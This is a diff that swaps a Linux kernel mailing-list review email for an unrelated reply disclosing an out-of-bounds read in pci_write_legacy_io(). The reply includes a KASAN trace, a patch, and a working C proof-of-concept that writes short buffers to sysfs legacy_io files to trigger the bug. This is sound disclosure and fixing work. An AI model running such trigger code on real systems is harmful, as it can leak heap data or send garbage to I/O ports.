@@ -1,153 +1,198 @@
-Received: from CH5PR02CU005.outbound.protection.outlook.com (mail-northcentralusazon11012071.outbound.protection.outlook.com [40.107.200.71])
+Received: from out162-62-57-252.mail.qq.com (out162-62-57-252.mail.qq.com [162.62.57.252])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C5D883B2FCD;
-	Mon, 15 Jun 2026 08:09:18 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=40.107.200.71
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781510959; cv=fail; b=skRN2vacjEc7mC/Wgbun4WcGCCjL4DYdhADmPD3z64/Wgf4bkHpXhvnFvcKqMzMFpFjt9WwMHqGsb7c4xmDyM+WmKLo6aumHMlRK7jYf+s6FDhfXq9iYqFDrJaDkZrTnxXQ6LPPIypcdU0AySiZhxNlewLsWm0Npi6RRwgyIbTE=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781510959; c=relaxed/simple;
-	bh=ICdNch8VN0g0vgoHGzvxMv+oA/shz/YZ99RbTuJny/Q=;
-	h=Content-Type:Date:Message-Id:Cc:Subject:From:To:References:
-	 In-Reply-To:MIME-Version; b=DJs+0GpGCwbGSmSUO0aredxlOtMWS/Q7ryqDJs6GaW1LwzCrsJpax+zB4EM9VYk5MAeUjZW1vlbJs3nbzQDqHEEV7ClZ5hLg8jxo189b7NS+ppySbO2sNmdVbukgjH6/Jd7zLCwtLcg8JFVE8C4RP6y9msHrjLs3zPfkwIPbnOQ=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com; spf=fail smtp.mailfrom=nvidia.com; dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b=fGOHfgsH; arc=fail smtp.client-ip=40.107.200.71
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com
-Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=nvidia.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5FBE033A6E2
+	for <linux-pci@vger.kernel.org>; Mon, 15 Jun 2026 09:01:01 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.252
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1781514069; cv=none; b=SygKCnGheFYZ/qtn/KwvZ1OZLe66H8B01WaevdOpro03/LnP9TWHzT1WZd+JdAs5U46lMNY6LsdXn1AKZYEnDyzBvpnidqGfvtNhu2OGfT3IvK9yxzelM6Zf076k7ko3kQ0YmIooL9qv6INlBRC7+7tZbYl7hOLqPU0PWZ5KOo8=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1781514069; c=relaxed/simple;
+	bh=BiRIk36aRlgFDld8cOjUwMutvWofMNuCgJoHAAmiKOY=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=NjMltYkFHCuqTBokErR4qTTFVStIONg1Gi1THghkI0f+XBmzBo3iLkcV63Y0CnFrOZjl7vBqVr2H05XiKGzIMaDc4WMlm0mUzHQwiVn6Pfgq4JRtMqbitlrJHpuW47lqMrU0Da+m+oBBVZ48b3WCVcX4nNQSxZMDcRqVXKt+Gao=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=PuA2Efmq; arc=none smtp.client-ip=162.62.57.252
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b="fGOHfgsH"
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=CZQfxO/MgrYC500yBwyuoJAtaQ3NnJ/t/lgkLo/UXth+A6/QxlFy8DZyteesWXFiIdBipWdMy1smAB/Fi/ur1P63VVYHAg5Y6sxJFFJb9MssIqbOvvFrORirNDsL1dvFtge2DlQMknsYUzzVWMWb5bNAh9qq1o1rU8KWBV98U9B7PYui9rSGNz9eOvwLYHSAdyCQjhbkg/6N7T0Z98f9LeNtxcH10m2nPcdfMQaH9/LBGQ3AaRwBq3TL+HDcDRKdNd+X9LabhqciSJ7mCh+rTwE9ao/gVZE59q4EQLQu0tY3WviG47/SV2KmAlASSz+8bYIKi0hCk2IaobfkTzN7CQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=ICdNch8VN0g0vgoHGzvxMv+oA/shz/YZ99RbTuJny/Q=;
- b=LALCncEO0kQxDFGJLi005o6NNzQNdI3cTjGNY3ojgjTU6qc0PL9QoHymIQbwU3hg3/jvY+6t/I0PXIafiEqqj5qsf8t/mbEMTbqWauuk6AXAOvBSK1YqQQ2s9x5V3Pn7XIPevelaqYVfMd6J5W2ZLn6nAcXgx/dG0VUoKsxFipdOxMnvgT8eAOB7UIxfUe+zgkH14PbUDkkHTAPL95ZpzrHvs19WdSrccqMWg0aCIXi5YL1J16AegSF9z2rCSgxjktEFBmOdWe3BhsUuZSkPkAbMCVJtC8QQmkTY330CcVloHhCbvvm/2cxliS8nqnxMOHPInaxmB7cLwc16niCq4w==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=nvidia.com; dmarc=pass action=none header.from=nvidia.com;
- dkim=pass header.d=nvidia.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Nvidia.com;
- s=selector2;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=ICdNch8VN0g0vgoHGzvxMv+oA/shz/YZ99RbTuJny/Q=;
- b=fGOHfgsHsiHzsJ3r5FpHK6JvQ357LhT6a/O8bh//meBAKlj8vcJw4f3y+CCGH1+1atT+F5YTYcayeibz9CFmqqmVBUOEFh5IAZlaXBAOGyIpw8e2CZGKCP49YmWVgHH0mqbhAa0K1GVitBkTRNJV8moMqubsnWgqqE7EulBKekQjgdztEIPcsqqzlHthnDfSB7Igcu+B1MeuC20b2Wj8/677NqC0tsDvushjMZGDV+ThlP48RcRQrMM+g+w9EsSkglRLB6ovjx6oGJrrrTyHyZDHpoB3q9VS5Gx8j3VtpZ3PgjZ41M8ldHaUBrAMvpg/fi4kLVQL3+ijLOQOh+Vl1g==
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=nvidia.com;
-Received: from CH2PR12MB3990.namprd12.prod.outlook.com (2603:10b6:610:28::18)
- by CYYPR12MB8703.namprd12.prod.outlook.com (2603:10b6:930:c4::9) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.113.18; Mon, 15 Jun
- 2026 08:09:14 +0000
-Received: from CH2PR12MB3990.namprd12.prod.outlook.com
- ([fe80::7de1:4fe5:8ead:5989]) by CH2PR12MB3990.namprd12.prod.outlook.com
- ([fe80::7de1:4fe5:8ead:5989%4]) with mapi id 15.21.0113.015; Mon, 15 Jun 2026
- 08:09:14 +0000
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain; charset=UTF-8
-Date: Mon, 15 Jun 2026 17:09:10 +0900
-Message-Id: <DJ9GXCFN7W8Y.ZXGHXUQKPPTF@nvidia.com>
-Cc: "Alice Ryhl" <aliceryhl@google.com>, "Daniel Almeida"
- <daniel.almeida@collabora.com>, "Greg Kroah-Hartman"
- <gregkh@linuxfoundation.org>, "Rafael J. Wysocki" <rafael@kernel.org>,
- "Miguel Ojeda" <ojeda@kernel.org>, "Boqun Feng" <boqun@kernel.org>,
- =?utf-8?q?Bj=C3=B6rn_Roy_Baron?= <bjorn3_gh@protonmail.com>, "Benno Lossin"
- <lossin@kernel.org>, "Andreas Hindborg" <a.hindborg@kernel.org>, "Trevor
- Gross" <tmgross@umich.edu>, "Bjorn Helgaas" <bhelgaas@google.com>,
- =?utf-8?q?Krzysztof_Wilczy=C5=84ski?= <kwilczynski@kernel.org>, "Abdiel
- Janulgue" <abdiel.janulgue@gmail.com>, "Robin Murphy"
- <robin.murphy@arm.com>, "David Airlie" <airlied@gmail.com>, "Simona Vetter"
- <simona@ffwll.ch>, "Danilo Krummrich" <dakr@kernel.org>,
- <driver-core@lists.linux.dev>, <rust-for-linux@vger.kernel.org>,
- <linux-kernel@vger.kernel.org>, <linux-pci@vger.kernel.org>,
- <nova-gpu@lists.linux.dev>, <dri-devel@lists.freedesktop.org>
-Subject: Re: [PATCH v4 06/20] rust: io: rename `Mmio` to `MmioOwned`
-From: "Alexandre Courbot" <acourbot@nvidia.com>
-To: "Gary Guo" <gary@garyguo.net>
-References: <20260611-io_projection-v4-0-1f7224b02dcb@garyguo.net>
- <20260611-io_projection-v4-6-1f7224b02dcb@garyguo.net>
-In-Reply-To: <20260611-io_projection-v4-6-1f7224b02dcb@garyguo.net>
-X-ClientProxiedBy: TY4P301CA0059.JPNP301.PROD.OUTLOOK.COM
- (2603:1096:405:36a::12) To CH2PR12MB3990.namprd12.prod.outlook.com
- (2603:10b6:610:28::18)
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="PuA2Efmq"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1781514052; bh=bAQXwn+qC2akO+xZ226TuyCtpNl+On4M2U4hUu2Wv5s=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To;
+	b=PuA2Efmq6JCJfc9v5O4uRAQXigWfr83lvZk+axCjdHGn9QdyekaTmYeOdWdI9wcmJ
+	 AFot0R7oeqCF4HHHl6WKabbikVnxJFxAdptZb+K612hfxOJDv4eH1xqKVog5aunIiX
+	 p340C8UE4xS2uwq5maJn9cTGS5xXpNxAw+Wd4ukE=
+Received: from [192.168.3.157] ([115.156.144.140])
+	by newxmesmtplogicsvrszb51-1.qq.com (NewEsmtp) with SMTP
+	id 3200ED8; Mon, 15 Jun 2026 17:00:50 +0800
+X-QQ-mid: xmsmtpt1781514050t7m0f2qpe
+Message-ID: <tencent_F4321A5EB5642AE407C42238ACC61714BB07@qq.com>
+X-QQ-XMAILINFO: NEGqkzgyFYqOy21RODdbG9rlTKPhvd5gsUs6LBSSBCrK5iSQB9W0YUtLtY942o
+	 Xx2+g7fM3JeSPbuezl4+RgOxTXMr4oLZAJbW/S8OU8v6z/uCG5jYtt9x00vqf6YDGCsSe8uCXxkY
+	 AOJ+oDOcBeeLE4aK7OfNQn7VGlLStG1yJ8mJZvk0BEUV8+Q6rGThJBuHflbso4jOehsKcnqWMpCh
+	 FA2LifYm0UZ/h+NpTIFRSqrCGoEImfwwk3ItFqulb9bi7VpqHP3OrtRrUFyvuOjJD4upB3BhyByF
+	 sjIALlw/zeUWprU9ErHshGnM2paleEWNxqa8KZWmkZzloUBsLSb8OVJ9e51ckgAx+zpb6r5mG2WE
+	 25+Y+XUIl/p+mz2azsulUUFjNS/YKudEg+i+MlMxEZkriyyMJ6RCAckaBgxBb7nXevctQ6WOaKAC
+	 Ro4iZI6h+nAy0Ha7yJFyd9AfFlPd2gRIPwvOpQ6127SwNcqawXBMNGMPRLzckmVAZHFMuUVDlYKS
+	 p37EA8Bxx6f/8dYos6/TKZzuFr1CKy9z/bs+ZoD28zSn+8yT1u91pzD6RY7rtOYDL2Rm4qX5SsIU
+	 ZENFA2N8dCGai4bIPaWm8+fcVgwHOKRWRuYX3kJdiy4mTGD1MbA/4XErUdKrze7oNfZygCBgtRZo
+	 d2F+eYHbnUbY0m4Zr2iAVrPgZFRNPRv1Mj7UWoOyk9wiVgjXEqyx+5jfYGBFP964XQfpZ0tBoQ2Y
+	 ajZsROIfpvggGeBP2onGgxo1erdy2317r14OrlLGNQLpMGhTQEqyASuQh958B9X8snRi1/FGh10h
+	 tdZbV9Gh4a4xad5u68Vt8pReKhvCDC9LzjRi9IfFsE/JO7vMUPYjH2/xSLXnloyCt8slIXE/jEMN
+	 4rO8W2hYfkenYXOPRTPBZcESl7VxDGYuY4caSISkf2neAA5fwZBzcXD7DBQj3BtA9Qoi8G0LAAAm
+	 IHJQ0xTynwV2QP/CALzqFiHBm9b1Zjdixgbez9sTLCDZoYim0HttqzwFmljP2JUnN6tFvL5X+Lcv
+	 lTvuuRcFO5c9FtwvLoem53Q4Z0kvaB5PNhUSRI6g==
+X-QQ-XMRINFO: M/715EihBoGS47X28/vv4NpnfpeBLnr4Qg==
+X-OQ-MSGID: <74d2da68-a1f1-484d-8ba4-95d2d224e81c@qq.com>
+Date: Mon, 15 Jun 2026 17:00:49 +0800
 Precedence: bulk
 X-Mailing-List: linux-pci@vger.kernel.org
 List-Id: <linux-pci.vger.kernel.org>
 List-Subscribe: <mailto:linux-pci+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-pci+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: CH2PR12MB3990:EE_|CYYPR12MB8703:EE_
-X-MS-Office365-Filtering-Correlation-Id: 4e970a32-26f3-4435-8f45-08decab56341
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam:
-	BCL:0;ARA:13230040|1800799024|366016|10070799003|23010399003|376014|7416014|18002099003|22082099003|56012099006|11063799006|4143699003;
-X-Microsoft-Antispam-Message-Info:
-	vqoCUWY5DEPbSBxFYtDQe5h9nX8/XPUoFkYb4KGYSi8GiOvT7x8RYK27v6JUl2DzC7C7wRtxO9chk89/POz6MQSHri4xN1jXT2BKVqCf95OIPBHiKlg3Qx1q0c6mORfaWkGvh1loAFiY8ZWH3rnbKt5oO6rDV75itrLm05TjbcHfZd7rVbcMHzHs4fuat0u0SbtvZP9C3x1GYZsV1I4Tu9ECXKG0DqSajqW5jBEMBo6ay83hft+3j2KU+41nHvSoAyVsaxbwO93S6p3J9h1nvZi9UmJNhGzsZZzwQ8X8lht0/NnUEqbuDG5B67n2FTRzBKOJrA5s7rPUOEMnIqrHZ7fNocaUI01mGpnaGhU82aeXR2uHQci8wxlaos1ring0O5VZkZPFfqRKcFDOJ3ezHY6Ckv7pl5PlkCKcEwoL8A1y/3Cm+z2csuoeNhPsc48nwnncIeWRLaE7aimwf8ABUt8tZlGH2b6qP2A8fEiyXQC4pTSPDyriiRuwhJPyQzTvBJsPMpHlQNmdVzdm8ZyczL2WmL7UauOguA6o+tAle1mF3+M3/VyoZbGNMG6id8Og+C+FohW8iNe5ofIE0tp8SQhVcMYaq53zumZJ4pIQ2tW/uLdtQyHrT3bPfHXJ6P1BDP/HDmAkXP/uXjUKaSsk+na3Tr4rmaKSsgf9XMLQ0IUo41Rh0u/4vJQNrd6IF8GK
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CH2PR12MB3990.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(366016)(10070799003)(23010399003)(376014)(7416014)(18002099003)(22082099003)(56012099006)(11063799006)(4143699003);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 2
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?MTlxZDB2N2QzNlBDUWd3UDZRMjFGKzBBRkVIaG9vUHBlVjlGUDB6aGRlR1FO?=
- =?utf-8?B?TEQya0ZGVzR4RzVDN1MyV2Nuc056MGJZNmNWVk9jcEJmRXdBMlpkUzlaMmRh?=
- =?utf-8?B?VjNFTlpqY056YklsSW1NQlVKc1RIUE1ORnlzejlqWk84blhISDhVOWZNK3ZH?=
- =?utf-8?B?dlNyci9FNFRvTDJoTE9Sei9BeHlMdTB5UDFNenFxdEltdGRwYjhMUFp4YVBk?=
- =?utf-8?B?RXBIR3BWaUVjRVplQmM5NmhMNzRTdmdoL0hRSGxnbXBFVkJyRHNnaXNKZUx2?=
- =?utf-8?B?QVZDaTZUQWxDcTN6dlRabU53Y0VsaHdiVzJFemNWUHpIRGVXZ2lUYkZNc0xy?=
- =?utf-8?B?SUo4NnhodElUY0ZwajRVWmJMME9hN2ttV1ovdVNIMDNJN2hTeFl3YmVpLzkx?=
- =?utf-8?B?ZDVZRGh1VVhOWkswZDVIbUNiUmVabDkzYWU3RXBlVXZwakdEQWNyUVo1ZWp2?=
- =?utf-8?B?akllZTBNTVpUNXFmcDlabVdhSGZma1RwUkk1QkJzWGNYbWNPNXFPT3EzVCsr?=
- =?utf-8?B?SG1RQjc4N05UNjhsTUJRTFB0ZGpYVWUrcCtRSWFQUHRIR2c4S1hhZHNkRFhp?=
- =?utf-8?B?ZnRsOUpsaVBjc3hjekZMSkJkVTlCbGNBWk9NVmFUMzlkd3FidlNlNmZTbU9J?=
- =?utf-8?B?MW5iMWd3NW1iVzhUdDUwdUsxTXVaS0Z0SHdGdzJqanV6RnVpbU96MEUzclFi?=
- =?utf-8?B?Sy9FUmx2anc4WFpCaHZGNXpSRHBkMzl4VVJVK0dFVWpWc0V6Q3p6YStLbTV5?=
- =?utf-8?B?a1dHckQ4eG5BZDlaTHVaWm03SG5sQktENEY0VGJ0V2MyK1JRMWRsS3Vzd2FC?=
- =?utf-8?B?dVoyYmRHUXpld2xuQ0FrTkpKYk82TGNDZmIwSXhPWWV5bHI2cjJjSFNaOVJG?=
- =?utf-8?B?SW0wYllPVFhBaDlkQWhWWThieExPSSt4T2MvR2xiNmcvYVBxdTlSSXhrSElC?=
- =?utf-8?B?MHFFZlNxRjkwUHRtU0ZUMitteksxam11V2RzMys0Sm5kem5Hd0FibWVIY2hh?=
- =?utf-8?B?MGM1YVFWcTNUQkR2eGtWS29ISCswT2MySXh6U29SREZxRzM0cUZleWRxeUUz?=
- =?utf-8?B?TUNTdTEyWGRKb2FNbFlmSjAvcGwzWmUwdFVoOWUrbTBxa01RWk12U3pqMG1M?=
- =?utf-8?B?SjhpZVp1aUVDeGdVU0w1eDFXUnFSTXMwemRyZ2ovblRCdE5NaWQxQit2SzJQ?=
- =?utf-8?B?VHBxckgvbUlMU1praDNzdlZHQUxKeVpDS1I4aEhkKzFGcS9uWU5mYzFxNE1x?=
- =?utf-8?B?NEg5MUducXRPNHRHT29OR1BzVEcrMXgvR1p1VnBxdHR4VE5RZEFNRXpYR21a?=
- =?utf-8?B?TkZybDAvLytiTWh6OWdLRDJ4NVF0Y2s4YWk4SWJQTndRNTJjdDhVbWptdlpP?=
- =?utf-8?B?dmZsY3hWSlBySlJLMzVaYllNQlRyNkMrZHBSaWlodDRqSktkbjJEam9yT2dU?=
- =?utf-8?B?SFFLR2hlZFdEK2RWTzliYm56QzR6cWpSdngwaDBoZzNXV1dveGlCV2pRZUxz?=
- =?utf-8?B?YnJ2OWQ4SXIzR2Zlbk5EK2ZxM0ZYQU9aZmwzaEVrS2NEMjllV0t4SnlpRGJ0?=
- =?utf-8?B?cmszQzdkc05vVU40c0kzWDB1dkhFNTVncFVYQlVBcjZDaHZmWTQzMmdWMm41?=
- =?utf-8?B?TnZTYWFnQmd4d2dkWUw1LzgyZXRaUGttZlBLZkhNV2dHL0YvNythcTBuS1Nt?=
- =?utf-8?B?ak8xZFVJSzIzcE9mdkRLZk5Ma015dXh6SGI0M0tROHNPWW1mTXlvVUwvZlJL?=
- =?utf-8?B?NzNvSlJaSFZLaDhOaTN4MUlNRVo3MmkrbGlSdjFCd1MxU2YrN3BXSXBVZjZP?=
- =?utf-8?B?ZGxxY3N0QjFHb0x4NjkxY24yRjFkamJTWjJCR0UraXd4SnY1Qkw5aGtQRGxH?=
- =?utf-8?B?bXU1QnUrS1UyUnRXZUczUjVGUWdEa0d5RlEzWUl0TzZzYmppQUlHRWFHRnlO?=
- =?utf-8?B?ZEIxM0lQT0psVTB6VHJkZWVDaHJLdTJnSmc0L0FRaDQyRENiMWwwTzZadWJJ?=
- =?utf-8?B?eUdaMDV3YlZtNW16UGp3b2VVVlpMdkdpVTc3U3RuZ0NxWjZCYytlWGt4bFZa?=
- =?utf-8?B?aThWZ2V1WGJNbE90NktnSG9tQi9mRzgzaUlZcFM4L1pOY1NuT1dza1dGUUtU?=
- =?utf-8?B?T1A3aWU3ajZmSFNTcUJnMDhFcHIySndZZXFOeUxTZzhlZk9CR0trRzRZRDRQ?=
- =?utf-8?B?bEUwQ1J0ZTZlNkszMCsrai9KaE51a0syWjZsMHRGQkQ4b05SQnV3aFkrM2xk?=
- =?utf-8?B?SVJUOExLL3pPcy9pTUZsU1BrQnJZbVhQYmREbGg1cFJFdFE3OEtNN1BReUtY?=
- =?utf-8?B?ZG5LdThhVUxDQXV0TVBqOG1IK3BFbDNnWDE0QjhMSWYxUTQ5RUIzYmYyYzBD?=
- =?utf-8?Q?1PugRX5avHTzc3lnbXeBvAuq173AQYAVK7TcdKIHS/BsX?=
-X-MS-Exchange-AntiSpam-MessageData-1: hiLeFc+oIk55HQ==
-X-OriginatorOrg: Nvidia.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 4e970a32-26f3-4435-8f45-08decab56341
-X-MS-Exchange-CrossTenant-AuthSource: CH2PR12MB3990.namprd12.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 15 Jun 2026 08:09:14.0529
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 43083d15-7273-40c1-b7db-39efd9ccc17a
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: LjkXO8WIskBYS9FXPx/ELPhLO46xBW3ke3OBtH0bWoUxAK44VAhQOtCpU+wwq2XrEO8ZqFmOwYeX2eqU7yae1A==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: CYYPR12MB8703
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH] alpha/PCI: Fix I/O port accessor argument order in
+ pci_legacy_write()
+To: =?UTF-8?Q?Krzysztof_Wilczy=C5=84ski?= <kwilczynski@kernel.org>,
+ sashiko-reviews@lists.linux.dev
+Cc: linux-pci@vger.kernel.org
+References: <20260612232400.585195-1-kwilczynski@kernel.org>
+ <20260612233426.B7EFD1F000E9@smtp.kernel.org>
+ <20260613151251.GB3086320@rocinante>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <20260613151251.GB3086320@rocinante>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-On Fri Jun 12, 2026 at 1:28 AM JST, Gary Guo wrote:
-> Most users would more commonly reach out to a view of `Mmio` rather than =
-an
-> owned instance of `Mmio`. Only implementor of `Io` like `Bar` or `IoMem`
-> would need the owned version. Thus, rename `Mmio` to `MmioOwned` so that
-> the name `Mmio` can be used for the view type instead.
->
-> Signed-off-by: Gary Guo <gary@garyguo.net>
+Hi Krzysztof,
 
-Reviewed-by: Alexandre Courbot <acourbot@nvidia.com>
+Following up on the Sashiko review that pointed out the `*(u32 *)buf`
+issue in pci_write_legacy_io() — I wrote a small PoC to confirm it on
+x86 with HAVE_PCI_LEGACY enabled for testing.
+
+As expected, writing 1 byte to `/sys/devices/pci*/legacy_io` reliably
+triggers a KASAN slab-out-of-bounds read in pci_write_legacy_io():
+
+   ==================================================================
+   BUG: KASAN: slab-out-of-bounds in pci_write_legacy_io+0xb5/0xc0
+   Read of size 4 at addr ffff888107c8ed88 by task bash/9528
+
+   Call Trace:
+    pci_write_legacy_io+0xb5/0xc0          <-- *(u32 *)buf
+    sysfs_kf_bin_write+0x17c/0x1f0
+    kernfs_fop_write_iter+0x3a4/0x580
+    vfs_write+0x7e1/0x11b0
+    ksys_write+0x12f/0x250
+    ...
+
+   Allocated by task 9528:
+    kernfs_fop_write_iter+0x22c/0x580       <-- kmalloc(2) for 1-byte write
+    ...
+
+   The buggy address is located 0 bytes inside of
+    allocated 2-byte region [ffff888107c8ed88, ffff888107c8ed8a)
+
+The kernel at line 921 in drivers/pci/pci-sysfs.c:
+
+ >    return pci_legacy_write(bus, off, *(u32 *)buf, count);
+
+unconditionally reads 4 bytes, but kernfs only allocated count+1 bytes
+(2 bytes for a 1-byte write).  The upper bytes of val get populated
+with uninitialized heap data, as the Sashiko review noted.
+
+On x86 this is "just" a KASAN splat since outb() truncates to the
+lowest byte, but on PowerPC where pci_legacy_write() does
+`out_8(addr, val >> 24)`, the garbage bytes would actually hit the I/O
+port.
+
+Hope the PoC helps.  Patch for pci_write_legacy_io() would be:
+
+--- a/drivers/pci/pci-sysfs.c
++++ b/drivers/pci/pci-sysfs.c
+@@ -918,7 +918,19 @@ static ssize_t pci_write_legacy_io(struct file 
+*filp, struct kobject *kobj,
+      if (count != 1 && count != 2 && count != 4)
+          return -EINVAL;
+
+-    return pci_legacy_write(bus, off, *(u32 *)buf, count);
++    u32 val = 0;
++    memcpy(&val, buf, count);
++    return pci_legacy_write(bus, off, val, count);
+  }
+
+Thanks,
+Xiao
+
+---8<--- poc.c ---
+/*
+  * PoC: KASAN slab-out-of-bounds in pci_write_legacy_io()
+  *
+  * drivers/pci/pci-sysfs.c unconditionally dereferences *(u32 *)buf
+  * regardless of count (1, 2, or 4).  Write 1 byte to legacy_io to
+  * trigger a 4-byte read from a 2-byte kmalloc buffer.
+  *
+  * Build:  gcc -Wall -O2 -o poc poc.c
+  * Run:    ./poc   (KASAN-enabled kernel with HAVE_PCI_LEGACY)
+  */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <dirent.h>
+#include <linux/limits.h>
+
+static int try_write(const char *dirname, const char *buf, size_t count)
+{
+     char path[PATH_MAX];
+     struct stat st;
+     int fd;
+
+     snprintf(path, sizeof(path), "/sys/devices/%s/legacy_io", dirname);
+     if (stat(path, &st) < 0) return -1;
+     fd = open(path, O_WRONLY);
+     if (fd < 0) return -1;
+
+     ssize_t ret = write(fd, buf, count);
+     printf("  %s (%zu bytes): %s\n", path, count,
+            ret < 0 ? strerror(errno) : "ok");
+     close(fd);
+     return ret >= 0 ? 0 : -1;
+}
+
+int main(void)
+{
+     DIR *dir = opendir("/sys/devices/");
+     struct dirent *entry;
+     int found = 0;
+
+     if (!dir) { perror("opendir"); return 1; }
+
+     printf("PoC: pci_write_legacy_io() slab-out-of-bounds\n\n");
+     while ((entry = readdir(dir))) {
+         if (strncmp(entry->d_name, "pci", 3)) continue;
+         printf("Found: %s\n", entry->d_name);
+
+         /* 1-byte write: kmalloc(2) → *(u32 *) reads 4 bytes */
+         if (try_write(entry->d_name, "\x01", 1) == 0) found++;
+         /* 2-byte write: kmalloc(3) → *(u32 *) reads 4 bytes */
+         if (try_write(entry->d_name, "\x01\x02", 2) == 0) found++;
+     }
+     closedir(dir);
+
+     if (!found) {
+         printf("\nNo legacy_io files.  Kernel likely lacks 
+HAVE_PCI_LEGACY.\n");
+         return 1;
+     }
+     printf("\nDone.  Check dmesg for KASAN report.\n");
+     return 0;
+}
+
+
